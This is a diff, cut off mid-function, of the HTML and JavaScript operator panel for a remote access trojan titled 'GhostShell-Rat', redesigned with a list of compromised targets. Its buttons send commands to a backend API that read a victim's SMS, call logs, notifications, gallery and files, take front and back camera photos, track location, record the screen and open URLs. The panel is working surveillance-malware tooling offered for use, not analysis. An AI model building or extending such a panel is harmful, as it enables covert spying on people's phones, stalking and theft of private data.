@@ -3,530 +3,799 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>GHOST//TERMINAL</title>
+    <title>GhostShell-Rat · anonymous</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Courier New', monospace, system-ui;
+        }
 
         :root {
-            --neon-cyan: #00f3ff;
-            --neon-green: #0f0;
-            --dark-bg: #0b0c10;
-            --panel-bg: #111317;
-            --glow: 0 0 8px;
-            --matrix-green: #1a2a1a;
+            --bg: #0b0f0e;
+            --surface: #141a1a;
+            --surface-light: #1f2828;
+            --accent-primary: #00ffc3;
+            --accent-secondary: #ff3b9e;
+            --glow-primary: rgba(0, 255, 195, 0.25);
+            --glow-secondary: rgba(255, 59, 158, 0.3);
+            --text: #dbdbdb;
+            --text-dim: #8fadad;
+            --border-glow: 0 0 0 1px var(--accent-primary), 0 0 12px var(--glow-primary);
+            --transition: all 0.25s cubic-bezier(0.23, 1, 0.32, 1);
         }
 
         body {
-            background-color: var(--dark-bg);
-            color: var(--neon-cyan);
-            font-family: 'Courier New', Courier, monospace;
+            background-color: var(--bg);
+            color: var(--text);
             min-height: 100vh;
+            padding: 8px;
             display: flex;
-            align-items: center;
+            align-items: flex-start;
             justify-content: center;
-            margin: 0;
-            padding: 10px;
-            text-shadow: 0 0 5px currentColor;
+            background-image: radial-gradient(circle at 20% 30%, #10312b 0%, transparent 40%);
+            background-attachment: fixed;
         }
 
-        /* BOOT SCREEN */
-        #boot-screen {
+        /* system loading bar — entrance */
+        #sys-loader {
             position: fixed;
             inset: 0;
-            background: #030303;
-            z-index: 10000;
+            background: var(--bg);
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
-            transition: opacity 0.6s cubic-bezier(0.97, 0.01, 0.36, 1.0);
-            font-size: clamp(14px, 4vw, 24px);
-            padding: 20px;
+            justify-content: center;
+            z-index: 9999;
+            transition: opacity 0.6s ease, visibility 0.6s;
+            backdrop-filter: blur(4px);
         }
-
-        .boot-anonymous {
-            font-size: 4rem;
-            filter: drop-shadow(0 0 15px #0f0);
-            margin-bottom: 30px;
-            letter-spacing: 5px;
+        .loader-hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
         }
-
-        .loading-bar-border {
-            width: min(80%, 400px);
-            height: 22px;
-            border: 2px solid var(--neon-green);
-            box-shadow: 0 0 20px var(--neon-green), inset 0 0 5px black;
-            margin: 25px 0 15px;
-            background: #000;
+        .cyber-bar {
+            width: 260px;
+            height: 6px;
+            background: #1f2b2b;
+            border-radius: 8px;
+            box-shadow: inset 0 0 6px #000;
+            margin: 20px 0 10px;
+            overflow: hidden;
         }
-
-        #loading-bar {
+        .cyber-fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #0f0, #adff2f);
-            box-shadow: 0 0 15px #0f0;
-            transition: width 0.15s ease-out;
-        }
-
-        /* MAIN DASHBOARD */
-        .container {
-            max-width: 1100px;
-            width: 100%;
-            margin: 0 auto;
-            background: rgba(5, 10, 5, 0.4);
-            backdrop-filter: blur(2px);
-            border: 1px solid #1f3a1f;
-            box-shadow: 0 0 30px rgba(0,255,0,0.1);
-            padding: 20px 15px;
-            border-radius: 12px;
-            display: none;
-        }
-
-        .header {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 2px solid var(--neon-cyan);
-            padding-bottom: 12px;
-            margin-bottom: 20px;
-        }
-
-        .header h1 {
-            font-size: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            word-break: break-word;
-        }
-
-        .status-badge {
-            font-size: 0.9rem;
-            padding: 5px 15px;
-            border-radius: 30px;
-            background: #101010;
-            border: 1px solid;
-            box-shadow: var(--glow) currentColor;
-        }
-
-        .online { color: #0f0; border-color: #0f0; }
-        .offline { color: #ff4444; border-color: #ff4444; }
-
-        /* DEVICE INFO PANEL */
-        .device-panel {
-            background: #0a0f0a;
-            border: 1px solid #2a4a2a;
-            padding: 15px;
-            margin-bottom: 25px;
+            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
+            box-shadow: 0 0 18px var(--glow-primary);
             border-radius: 8px;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 20px 35px;
-            box-shadow: inset 0 0 20px #000;
+            transition: width 2.5s ease-out;
+        }
+        #loader-text {
+            font-size: 1.6rem;
+            font-weight: 300;
+            letter-spacing: 6px;
+            color: var(--accent-primary);
+            text-shadow: 0 0 8px var(--accent-primary);
+            animation: flicker 2.4s infinite;
+        }
+        .small-glitch {
+            color: var(--accent-secondary);
+            font-size: 0.8rem;
+            opacity: 0.7;
         }
 
-        .device-panel p {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 1rem;
-        }
-
-        .device-panel i { font-style: normal; color: #0f0; }
-
-        /* GRID BUTTONS */
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 15px;
-            margin: 30px 0 15px;
-        }
-
-        .grid button {
-            background: #0e1210;
-            border: 1px solid #2f4f2f;
-            color: var(--neon-cyan);
-            padding: 16px 8px;
-            font-family: 'Courier New', monospace;
-            font-weight: bold;
-            font-size: 0.9rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            cursor: pointer;
-            border-radius: 10px;
-            box-shadow: 0 0 8px rgba(0,255,255,0.2);
-            transition: 0.2s;
+        /* main app container */
+        .app-container {
+            width: 100%;
+            max-width: 1300px;
             display: flex;
             flex-direction: column;
+            gap: 14px;
+        }
+
+        /* header */
+        .header {
+            background: var(--surface);
+            border: 1px solid var(--accent-primary);
+            box-shadow: 0 0 15px var(--glow-primary);
+            padding: 1rem 1.2rem;
+            border-radius: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            backdrop-filter: blur(4px);
+        }
+        .header h1 {
+            font-size: 1.8rem;
+            font-weight: 400;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, #b0ffec, var(--accent-secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .ghost-icon {
+            color: var(--accent-secondary);
+            font-size: 2rem;
+            filter: drop-shadow(0 0 8px #ff3b9e);
+        }
+
+        /* main two-column grid */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 260px 1fr;
+            gap: 16px;
+        }
+
+        /* device panel */
+        .device-panel {
+            background: var(--surface);
+            border-radius: 28px;
+            border: 1px solid var(--accent-primary);
+            padding: 18px 12px;
+            box-shadow: var(--border-glow);
+            backdrop-filter: blur(4px);
+            max-height: 70vh;
+            overflow-y: auto;
+            scrollbar-width: thin;
+            scrollbar-color: var(--accent-primary) #162020;
+        }
+        .device-panel h2 {
+            font-size: 1.2rem;
+            margin-bottom: 16px;
+            color: var(--accent-secondary);
+            border-bottom: 1px dashed var(--accent-primary);
+            padding-bottom: 8px;
+            display: flex;
             align-items: center;
             gap: 8px;
         }
-
-        .grid button:hover {
-            background: #1f3a1f;
-            color: black;
-            border-color: #0f0;
-            box-shadow: 0 0 18px #0f0, inset 0 0 5px #9acd32;
+        .device-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .device-item {
+            background: #1b2626;
+            padding: 14px 12px;
+            border-radius: 18px;
+            border: 1px solid transparent;
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.6);
+        }
+        .device-item:hover {
+            border-color: var(--accent-primary);
+            background: #1f2e2e;
+            transform: translateY(-2px);
+        }
+        .device-item.active {
+            border: 1px solid var(--accent-secondary);
+            box-shadow: 0 0 16px var(--glow-secondary);
+            background: #1d2c2c;
+        }
+        .device-item strong {
+            display: block;
+            font-size: 1rem;
+            color: var(--accent-primary);
+        }
+        .device-item small {
+            font-size: 0.75rem;
+            color: var(--text-dim);
         }
 
-        .grid button i { font-size: 24px; filter: drop-shadow(0 0 6px cyan); }
-
-        .btn-flash-on {
-            background: #0f0 !important;
-            color: black !important;
-            border-color: #adff2f !important;
-            box-shadow: 0 0 25px #0f0 !important;
+        /* main content area */
+        .main-panel {
+            background: var(--surface);
+            border-radius: 28px;
+            border: 1px solid var(--accent-primary);
+            padding: 18px 16px;
+            box-shadow: var(--border-glow);
+            backdrop-filter: blur(4px);
         }
 
-        /* MODALS */
-        .modal-overlay {
+        .status-bar-mod {
+            display: flex;
+            justify-content: space-between;
+            background: #0f1818;
+            padding: 12px 18px;
+            border-radius: 40px;
+            margin-bottom: 22px;
+            border: 1px solid #2a3a3a;
+            font-size: 0.95rem;
+            flex-wrap: wrap;
+        }
+        .target-glow {
+            color: var(--accent-primary);
+            font-weight: 500;
+            text-shadow: 0 0 5px var(--accent-primary);
+        }
+        .status-online {
+            color: #00ffc3;
+            font-weight: 600;
+            position: relative;
+            padding-left: 14px;
+        }
+        .status-online::before {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 6px;
+            width: 10px;
+            height: 10px;
+            background: #00ffc3;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        /* feature grid */
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
+            gap: 12px;
+        }
+        .grid-item {
+            background: #1b2828;
+            border: 1px solid #2f4040;
+            border-radius: 24px;
+            padding: 16px 6px;
+            text-align: center;
+            color: var(--accent-primary);
+            transition: var(--transition);
+            font-size: 0.8rem;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            backdrop-filter: blur(2px);
+        }
+        .grid-item i {
+            font-size: 2rem;
+            margin-bottom: 8px;
+            display: block;
+            color: var(--accent-secondary);
+        }
+        .grid-item:active {
+            transform: scale(0.96);
+        }
+        .grid-item:not(.disabled):hover {
+            background: #1e3030;
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 24px var(--glow-primary);
+        }
+        .grid-item.disabled {
+            opacity: 0.25;
+            filter: grayscale(1);
+            pointer-events: none;
+        }
+
+        /* modal — sleek */
+        .modal {
+            display: none;
             position: fixed;
             inset: 0;
-            background: rgba(0, 16, 0, 0.85);
-            backdrop-filter: blur(6px);
-            z-index: 2000;
-            display: none;
+            background: rgba(2, 10, 10, 0.85);
+            backdrop-filter: blur(8px);
             align-items: center;
             justify-content: center;
-            padding: 12px;
+            z-index: 1000;
+            padding: 16px;
         }
-
-        .modal-terminal {
-            background: #0c0f0c;
-            border: 3px solid #0f0;
+        .modal-card {
+            background: var(--surface);
             width: 100%;
-            max-width: 950px;
-            height: 85vh;
-            max-height: 800px;
-            box-shadow: 0 0 50px #0f0, inset 0 0 20px #002200;
-            border-radius: 20px;
+            max-width: 900px;
+            max-height: 85vh;
+            border-radius: 36px;
+            border: 1px solid var(--accent-primary);
+            box-shadow: 0 0 40px var(--glow-secondary);
             display: flex;
             flex-direction: column;
             overflow: hidden;
         }
-
         .modal-header {
-            background: #1a2a1a;
-            padding: 12px 18px;
+            padding: 22px 24px;
+            background: #101b1b;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 2px solid #0f0;
-            color: #0f0;
-            font-weight: bold;
-            font-size: 1.2rem;
+            border-bottom: 1px solid #2e4545;
+        }
+        .modal-header h2 {
+            color: var(--accent-secondary);
+            font-weight: 400;
+            letter-spacing: 1px;
+        }
+        .close-btn {
+            font-size: 2.2rem;
+            line-height: 1;
+            color: var(--text-dim);
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .close-btn:hover {
+            color: var(--accent-secondary);
+            transform: scale(1.2);
+        }
+        .modal-body {
+            padding: 22px;
+            overflow-y: auto;
+            background: #121d1d;
+            flex: 1;
+            font-size: 0.9rem;
+            scroll-behavior: smooth;
+        }
+        .modal-footer {
+            padding: 16px 22px;
+            background: #0c1616;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            align-items: center;
+            border-top: 1px solid #2e4545;
         }
 
-        .close-btn {
-            background: black;
-            border: 1px solid red;
-            color: red;
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
+        /* loading bar inside modal / popup */
+        .data-loader {
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            font-size: 22px;
-            cursor: pointer;
-            transition: 0.2s;
+            padding: 32px;
+            width: 100%;
+        }
+        .mini-loader-bar {
+            width: 200px;
+            height: 5px;
+            background: #1f2f2f;
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 20px 0 10px;
+        }
+        .mini-loader-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
+            box-shadow: 0 0 20px magenta;
+            transition: width 1.2s ease;
         }
 
-        .close-btn:hover { background: red; color: black; box-shadow: 0 0 20px red; }
-
-        .modal-body {
-            flex: 1;
-            padding: 18px;
-            overflow-y: auto;
-            background: #030703;
-            font-size: 0.95rem;
-            line-height: 1.5;
-            white-space: pre-wrap;
-            word-break: break-all;
-            font-family: 'Courier New', Courier, monospace;
-            color: #b3ffb3;
+        /* popup notif (toast) */
+        .toast-popup {
+            position: fixed;
+            top: 24px;
+            right: 24px;
+            background: #121f1f;
+            border-left: 6px solid var(--accent-secondary);
+            padding: 18px 24px;
+            border-radius: 48px;
+            box-shadow: 0 10px 30px rgba(255, 0, 255, 0.3);
+            border: 1px solid var(--accent-primary);
+            color: white;
+            max-width: 320px;
+            z-index: 3000;
+            backdrop-filter: blur(16px);
+            transform: translateX(400px);
+            animation: slideIn 0.3s forwards;
         }
-
-        .modal-footer {
-            background: #121812;
-            padding: 15px;
+        .toast-popup.info {
+            border-left-color: var(--accent-primary);
+        }
+        .toast-content {
             display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            border-top: 2px solid #2c5a2c;
             align-items: center;
+            gap: 16px;
+        }
+        .toast-content i {
+            font-size: 1.8rem;
+            color: var(--accent-secondary);
         }
 
-        .modal-footer input {
-            flex: 3 1 200px;
-            background: #000;
-            border: 1px solid #0f0;
-            color: #0f0;
-            padding: 12px 16px;
-            font-family: inherit;
-            font-size: 1rem;
-            outline: none;
-            border-radius: 40px;
-            box-shadow: inset 0 0 10px black, 0 0 10px rgba(0,255,0,0.3);
+        /* table */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th {
+            text-align: left;
+            color: var(--accent-primary);
+            font-weight: 400;
+            border-bottom: 1px solid #3d5a5a;
+            padding: 8px 4px;
+        }
+        td {
+            padding: 8px 4px;
+            border-bottom: 1px solid #1e2e2e;
+            color: var(--text-dim);
+        }
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+            gap: 16px;
+        }
+        .gallery-item img {
+            width: 100%;
+            height: 110px;
+            object-fit: cover;
+            border-radius: 24px;
+            border: 2px solid var(--accent-primary);
         }
 
-        .modal-footer button {
-            flex: 0 1 auto;
-            background: #103010;
-            border: 2px solid #0f0;
-            color: #0f0;
-            padding: 12px 22px;
+        /* animation keyframes */
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.2); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        @keyframes flicker {
+            0% { opacity: 1; }
+            45% { opacity: 1; }
+            46% { opacity: 0.2; }
+            47% { opacity: 1; }
+            48% { opacity: 0.2; }
+            49% { opacity: 1; }
+            90% { opacity: 1; }
+            91% { opacity: 0.3; }
+            92% { opacity: 1; }
+        }
+        @keyframes slideIn {
+            to { transform: translateX(0); }
+        }
+
+        /* mobile tweaks */
+        @media (max-width: 700px) {
+            .dashboard-grid { grid-template-columns: 1fr; }
+            .device-panel { max-height: 38vh; }
+            .header h1 { font-size: 1.3rem; }
+        }
+
+        input, button {
+            background: #1e2e2e;
+            border: 1px solid #3b5e5e;
+            padding: 12px 18px;
+            border-radius: 60px;
+            color: white;
+            font-size: 0.9rem;
+        }
+        button {
+            background: var(--accent-primary);
+            color: #000;
             font-weight: bold;
-            border-radius: 40px;
+            border: none;
             cursor: pointer;
-            font-size: 1rem;
-            transition: 0.2s;
-            box-shadow: 0 0 10px #0f0;
+            transition: var(--transition);
+            box-shadow: 0 0 12px var(--glow-primary);
         }
-
-        .modal-footer button:hover { background: #0f0; color: black; }
-
-        @media (max-width: 600px) {
-            .grid { grid-template-columns: repeat(2, 1fr); }
-            .header h1 { font-size: 1.2rem; }
-            .modal-footer input { flex: 1 1 100%; }
-            .modal-footer button { width: 100%; }
-        }
+        button:active { transform: scale(0.95); }
     </style>
 </head>
 <body>
-
-<div id="boot-screen">
-    <div class="boot-anonymous">⍟⍟⍟</div>
-    <div style="color:#0f0; font-size:1.5rem;">ESTABLISHING SECURE CHANNEL</div>
-    <div class="loading-bar-border"><div id="loading-bar"></div></div>
-    <p id="boot-text" style="color:#5f9ea0;">[ SYSTEM BOOT ] handshake ...</p>
-    <p style="margin-top:30px; color:#2e8b57;">GHOSTSHELL // ANONYMOUS MODE</p>
-</div>
-
-<div class="container" id="main-app">
-    <div class="header">
-        <h1><span>⌨️ GHOST//RAT</span></h1>
-        <div id="status" class="status-badge offline">OFFLINE</div>
+    <!-- ENTRANCE SYSTEM LOADER (only once) -->
+    <div id="sys-loader">
+        <div id="loader-text">GHOST//SHELL</div>
+        <div class="cyber-bar"><div class="cyber-fill" id="loader-fill" style="width:0%"></div></div>
+        <div class="small-glitch">booting secure channel ...</div>
     </div>
 
-    <div class="device-panel">
-        <p>🖥️ <i>IP_TARGET:</i> <span id="info-ip">--.--.--.--</span></p>
-        <p>📟 <i>DEVICE:</i> <span id="info-device">Scanning...</span></p>
-        <p>🌐 <i>INTERFACE:</i> <span id="info-extra">WLAN0</span></p>
-    </div>
+    <div class="app-container">
+        <header class="header">
+            <h1><i class="fas fa-skull"></i> GhostShell-Rat</h1>
+            <div class="ghost-icon"><i class="fas fa-ghost"></i></div>
+        </header>
 
-    <div class="grid">
-        <button onclick="openModal('terminal')"><i>⌨️</i> TERMINAL</button>
-        <button onclick="openModal('filemanager')"><i>📁</i> FILE MANAGER</button>
-        <button onclick="openModal('apps')"><i>📱</i> APPLICATIONS</button>
-        <button onclick="openModal('sms')"><i>✉️</i> SMS INTERCEPT</button>
-        <button onclick="openModal('calls')"><i>📞</i> CALL LOGS</button>
-        <button onclick="cmd('deviceinfo')"><i>📡</i> SCAN TARGET</button>
-        <button onclick="cmd('get_location')"><i>📍</i> TRACK</button>
-        <button onclick="toggleFlash()" id="flashBtn"><i>⚡</i> FLASH</button>
-        <button onclick="cmd('takefrontpic')"><i>🤳</i> FRONT CAM</button>
-        <button onclick="cmd('takebackpic')"><i>📷</i> BACK CAM</button>
-    </div>
-    <div style="color:#3c5e3c; text-align:center; font-size:0.8rem; padding:8px;">[ anonymous root access ]</div>
-</div>
+        <div class="dashboard-grid">
+            <!-- left panel targets -->
+            <div class="device-panel">
+                <h2><i class="fas fa-satellite-dish"></i> TARGETS</h2>
+                <div class="device-list" id="device-list">[scanning...]</div>
+            </div>
 
-<div class="modal-overlay" id="globalModal">
-    <div class="modal-terminal">
-        <div class="modal-header">
-            <span id="modalTitle">> GHOST_TERMINAL</span>
-            <span class="close-btn" onclick="closeModal()">✕</span>
+            <!-- main right panel -->
+            <div class="main-panel">
+                <div class="status-bar-mod">
+                    <span>🎯 <span class="target-glow" id="device-info">None Selected</span></span>
+                    <span>⚡ <span class="status-online" id="connection-status">OFFLINE</span></span>
+                </div>
+
+                <!-- feature grid inject via js -->
+                <div class="feature-grid" id="main-grid-panel"></div>
+            </div>
         </div>
-        <div class="modal-body" id="modalOutput">[CONNECTING ...]</div>
-        <div class="modal-footer" id="modalFooter"></div>
     </div>
-</div>
 
-<script>
-    // --- BOOT SEQUENCE ---
-    let progress = 0;
-    const bootEl = document.getElementById('boot-screen');
-    const loadingBar = document.getElementById('loading-bar');
-    const bootText = document.getElementById('boot-text');
+    <!-- MODAL -->
+    <div id="main-modal" class="modal">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h2 id="modal-title">modal</h2>
+                <span class="close-btn" onclick="closeModal()">&times;</span>
+            </div>
+            <div class="modal-body" id="modal-body"><div class="data-loader">...</div></div>
+            <div class="modal-footer" id="modal-footer"></div>
+        </div>
+    </div>
 
-    const bootInterval = setInterval(() => {
-        progress += Math.floor(Math.random() * 8) + 4;
-        if (progress >= 100) {
-            progress = 100;
-            clearInterval(bootInterval);
-            bootText.innerText = 'ACCESS GRANTED. LOADING INTERFACE...';
-            setTimeout(() => {
-                bootEl.style.opacity = '0';
+    <!-- popup container (toast) -->
+    <div id="popup-toast" class="toast-popup" style="display: none;"></div>
+
+    <script>
+        (function() {
+            // --- LOADING BAR animation on entry ---
+            const loader = document.getElementById('sys-loader');
+            const fill = document.getElementById('loader-fill');
+            let width = 0;
+            const interval = setInterval(() => {
+                width += 2;
+                if (width >= 100) {
+                    width = 100;
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        loader.classList.add('loader-hidden');
+                    }, 400);
+                }
+                fill.style.width = width + '%';
+            }, 30);
+        })();
+
+        // ---------- STATE & CACHE ----------
+        let state = { devices: [] };
+        let selectedClientId = null;
+        let currentModal = null;
+        let clientDataCache = {};
+        let notificationHashes = new Set();
+        let agentMessageHashes = new Set();
+        let flashOn = false, screenRecordOn = false;
+        let popupHideTimer = null;
+        let modalLoading = false;  // to avoid multiple animations
+
+        // helper: show modern popup (no refresh)
+        function showPopup(type, message) {
+            const toast = document.getElementById('popup-toast');
+            toast.style.display = 'block';
+            toast.innerHTML = `<div class="toast-content"><i class="fas fa-${type === 'error' ? 'exclamation-triangle' : 'bell'}"></i><span>${message}</span></div>`;
+            toast.className = `toast-popup ${type === 'error' ? 'info' : ''}`;
+            if (popupHideTimer) clearTimeout(popupHideTimer);
+            popupHideTimer = setTimeout(() => {
+                toast.style.display = 'none';
+            }, 6000);
+        }
+
+        // api call
+        async function sendCommand(cmd, body = {}) {
+            if (!selectedClientId) { showPopup('error', 'no target'); return; }
+            try {
+                await fetch('/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cmd, client_id: selectedClientId, ...body })
+                });
+            } catch (e) { console.error(e); }
+        }
+
+        // select device
+        function selectDevice(clientId) {
+            if (selectedClientId === clientId) return;
+            selectedClientId = clientId;
+            flashOn = false; screenRecordOn = false;
+            document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
+            const safeId = `device-${clientId.replace(/[:.]/g, '-')}`;
+            const el = document.getElementById(safeId);
+            if (el) el.classList.add('active');
+            updateMainDashboard();
+            closeModal();
+        }
+
+        // update device list
+        function updateDeviceList() {
+            const container = document.getElementById('device-list');
+            if (!state.devices.length) {
+                container.innerHTML = '<div class="device-item" style="opacity:0.5">♢ no ghosts</div>';
+                if(selectedClientId) selectedClientId = null;
+                updateMainDashboard();
+                return;
+            }
+            let html = '';
+            state.devices.forEach(dev => {
+                const safeId = `device-${dev.id.replace(/[:.]/g, '-')}`;
+                html += `<div class="device-item ${selectedClientId === dev.id ? 'active' : ''}" id="${safeId}" onclick="selectDevice('${dev.id}')">
+                    <strong>${dev.model || 'unknown'}</strong>
+                    <small>${dev.id} · ${dev.battery || '??'}</small>
+                </div>`;
+            });
+            container.innerHTML = html;
+            if (!selectedClientId || !state.devices.some(d => d.id === selectedClientId)) {
+                if (state.devices.length) selectDevice(state.devices[0].id);
+            } else {
+                // re-highlight
+                document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
+                const activeEl = document.getElementById(`device-${selectedClientId.replace(/[:.]/g, '-')}`);
+                if(activeEl) activeEl.classList.add('active');
+            }
+            updateMainDashboard();
+        }
+
+        function updateMainDashboard() {
+            const infoSpan = document.getElementById('device-info');
+            const connSpan = document.getElementById('connection-status');
+            const grid = document.getElementById('main-grid-panel');
+            const enabled = selectedClientId && state.devices.some(d => d.id === selectedClientId);
+            if (enabled) {
+                const dev = state.devices.find(d => d.id === selectedClientId);
+                infoSpan.innerText = dev ? dev.info_str || dev.id : selectedClientId;
+                connSpan.innerHTML = 'ONLINE';
+                connSpan.className = 'status-online';
+            } else {
+                infoSpan.innerText = 'None Selected';
+                connSpan.innerHTML = 'OFFLINE';
+                connSpan.className = '';
+                connSpan.style.color = '#ff5f7c';
+            }
+
+            const buttons = [
+                'sms','calls','filemanager','gallery','notifications','apps','toast','openurl',
+                'get_location','flash','screenrecord','takebackpic','takefrontpic'
+            ];
+            grid.innerHTML = buttons.map(btn => {
+                let icon = 'fa-question', label = btn;
+                if (btn === 'sms') icon = 'fa-sms';
+                else if (btn === 'calls') icon = 'fa-phone-alt';
+                else if (btn === 'filemanager') icon = 'fa-folder-open';
+                else if (btn === 'gallery') icon = 'fa-images';
+                else if (btn === 'notifications') icon = 'fa-bell';
+                else if (btn === 'apps') icon = 'fa-th-large';
+                else if (btn === 'toast') icon = 'fa-window-maximize';
+                else if (btn === 'openurl') icon = 'fa-external-link-alt';
+                else if (btn === 'get_location') icon = 'fa-map-marker-alt';
+                else if (btn === 'flash') icon = 'fa-bolt';
+                else if (btn === 'screenrecord') icon = 'fa-video';
+                else if (btn === 'takebackpic') icon = 'fa-camera-retro';
+                else if (btn === 'takefrontpic') icon = 'fa-camera';
+
+                if (btn === 'flash') label = flashOn ? 'FLASH ON' : 'FLASH OFF';
+                if (btn === 'screenrecord') label = screenRecordOn ? 'REC ON' : 'REC OFF';
+
+                return `<div class="grid-item ${!enabled ? 'disabled' : ''}" onclick="handleGridClick('${btn}')"><i class="fas ${icon}"></i>${label}</div>`;
+            }).join('');
+        }
+
+        // global click handler for grid
+        window.handleGridClick = (action) => {
+            if (!selectedClientId) { showPopup('error', 'Select target first'); return; }
+            const specials = ['flash','screenrecord','takebackpic','takefrontpic','get_location','toast','openurl','sms','calls','filemanager','gallery','notifications','apps'];
+            if (action === 'flash') { toggleFlash(); updateMainDashboard(); }
+            else if (action === 'screenrecord') { toggleScreenRecord(); updateMainDashboard(); }
+            else if (action === 'takebackpic') sendCommand('takebackpic');
+            else if (action === 'takefrontpic') sendCommand('takefrontpic');
+            else if (action === 'get_location') sendCommand('get_location');
+            else if (action === 'toast') openModal('toast');
+            else if (action === 'openurl') openModal('openurl');
+            else if (action === 'sms') openModal('sms');
+            else if (action === 'calls') openModal('calls');
+            else if (action === 'filemanager') openModal('filemanager');
+            else if (action === 'gallery') openModal('gallery');
+            else if (action === 'notifications') openModal('notifications');
+            else if (action === 'apps') openModal('apps');
+        };
+
+        function toggleFlash() { flashOn = !flashOn; sendCommand(flashOn ? 'flashon' : 'flashoff'); }
+        function toggleScreenRecord() { screenRecordOn = !screenRecordOn; sendCommand(screenRecordOn ? 'screenrecord start' : 'screenrecord stop'); }
+
+        // MODAL with loading bar simulation (if data missing)
+        function openModal(type) {
+            if (!selectedClientId) return showPopup('error', 'no target');
+            currentModal = type;
+            document.getElementById('main-modal').style.display = 'flex';
+            document.getElementById('modal-title').innerText = type.toUpperCase();
+            const body = document.getElementById('modal-body');
+            const footer = document.getElementById('modal-footer');
+            body.innerHTML = `<div class="data-loader"><i class="fas fa-spinner fa-pulse" style="font-size:2rem;color:var(--accent-secondary)"></i><div class="mini-loader-bar"><div class="mini-loader-fill" style="width:90%"></div></div><span>injecting...</span></div>`;
+            footer.innerHTML = '';
+
+            if (!clientDataCache[selectedClientId]) {
+                // fake loading then show no data
                 setTimeout(() => {
-                    bootEl.style.display = 'none';
-                    document.getElementById('main-app').style.display = 'block';
-                    cmd('deviceinfo'); // Auto-fetch device info on load
-                }, 600);
-            }, 400);
+                    if (currentModal === type) body.innerHTML = '<p style="color:var(--text-dim)">◈ no cached data, but you can request manually.</p>';
+                }, 900);
+            } else {
+                // render after tiny delay to mimic loading
+                setTimeout(() => renderModalContent(), 400);
+            }
+            // request fresh data
+            const cmdMap = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications' };
+            if (cmdMap[type]) sendCommand(cmdMap[type]);
         }
-        loadingBar.style.width = progress + '%';
-        if (progress > 30) bootText.innerText = '[ OK ] DECRYPTING PAYLOAD...';
-        if (progress > 65) bootText.innerText = '[ ✓ ] ESTABLISHING GHOST PROXY...';
-    }, 160);
 
-    // --- GLOBAL STATE ---
-    let currentModalType = null;
-    let flashActive = false;
-    let lastLogCount = 0;
+        window.closeModal = () => {
+            if (currentModal === 'gallery') sendCommand('exit_gallery');
+            document.getElementById('main-modal').style.display = 'none';
+            currentModal = null;
+        };
 
-    const modal = document.getElementById('globalModal');
-    const modalTitle = document.getElementById('modalTitle');
-    const modalOutput = document.getElementById('modalOutput');
-    const modalFooter = document.getElementById('modalFooter');
+        function renderModalContent() {
+            if (!currentModal || !selectedClientId) return;
+            const body = document.getElementById('modal-body');
+            const footer = document.getElementById('modal-footer');
+            const data = clientDataCache[selectedClientId] || {};
+            footer.innerHTML = '';
 
-    function cmd(command) {
-        fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ cmd: command })
-        }).catch(err => console.warn('cmd err', err));
-    }
-
-    function toggleFlash() {
-        flashActive = !flashActive;
-        const btn = document.getElementById('flashBtn');
-        if (flashActive) {
-            cmd('flashon');
-            btn.classList.add('btn-flash-on');
-            btn.innerHTML = '<i>⚡</i> FLASH ON';
-        } else {
-            cmd('flashoff');
-            btn.classList.remove('btn-flash-on');
-            btn.innerHTML = '<i>⚡</i> FLASH';
+            if (currentModal === 'gallery') {
